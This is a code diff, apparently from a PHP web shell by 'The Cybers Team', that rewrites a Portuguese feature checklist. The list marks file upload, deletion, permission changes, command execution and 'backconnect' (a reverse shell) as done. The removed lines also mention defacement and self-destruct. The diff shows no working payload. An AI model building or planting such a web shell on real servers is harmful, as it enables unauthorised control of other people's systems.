@@ -241,52 +241,34 @@ else{
 /*
 	By: The Cybers Team
 	Versão: v1.0
-
-	OLD!!!
-
-	[ok] listar
-	[no] visualizar
-	[ok] download
-	[ok] editar
-	[ok] deletar
-	[ok] upload
-	[ok] navegar
-	[ok] executar
-	[ok] renomear
-	[ok] criar
-	[no] hint bar
-	[ok] novo arquivo
-	[ok] permissoes
-	[no] gerar deface
-	[ok] comandos
 	
+	Arquivos:
+		- baixar [ok]
+		- renomear [ok]
+		- deletar [ok]
+		- selecionar todos [no]
+		- deletar selecionados [no]
+		- upload [ok]
+		- permissão [ok]
+		- tamanho [ok]
+	
+	Comandos:
+		- executar [ok]
 
-	IMPORTANTE!!!
+	Conexão:
+		- backconnect [ok]
+		- bind connect [no]
 
-	[ok] - Login
-	- Navegar nos diretorios
-	- Upload de arquivo
-	- Editar arquivo
-	- Deletar arquivo
-	- Renomear arquivo
-	- Listar arquivos
-	- Versão do kernel
-	- Ip do servidor
-	- Nome do host
-	- Executar comandos
-	- Back connect
-	- Bind connect
-	- Auto destruir
-	- Auto update
+	Lookup:
+		- Ip lookup domain [ok]
+	
+	Info
+		- [no]
 
-
-	Features!!!
-	- memoria
-	- processos
-	- time up
 */
 
 // Funções =======================================================
+
 function painel($diretorio){
 echo "
 <div class='row'>
